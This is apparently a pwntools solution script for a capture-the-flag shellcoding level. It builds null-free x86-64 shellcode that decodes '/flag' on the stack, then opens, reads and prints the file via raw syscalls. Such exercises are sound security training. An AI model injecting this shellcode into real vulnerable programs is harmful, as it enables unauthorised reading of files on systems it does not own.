from pwn import *
# io = process('./babyshell_level')


context.arch = 'amd64'

# a = 0x67616c662f^0x0101010101010101
# b = 0x1010166606d672e

sc = asm('''

    xor rsi, rsi 
    xor rdx, rdx 
    mov rax, 0x1010166606d672e
    push rax
    mov rax, 0x0101010101010101
    xor [rsp],rax
    mov rdi, rsp 
    xor rax, rax 
    mov al, 2                    ; //Syscall number for open()
    syscall 

    mov rdi, rax                 ; //Store the file descriptor in rdi
    xor rax, rax                 ; //Syscall number for read()
    mov rsi, rsp                 ; //Buffer to read into (rsp)
    mov dl, 128                  ; //Number of bytes to read
    syscall 

    mov rdx, rax                 ; //Number of bytes read is returned in rax, use it for write()
    mov al, 1                    ; //Syscall number for write()
    mov dil, 1                   ; //File descriptor for stdout (1)
    syscall 

    mov al, 60                   ; //Syscall number for exit()
    xor edi, edi                 ; //Exit code 0
    syscall 


	''')

print(disasm(sc))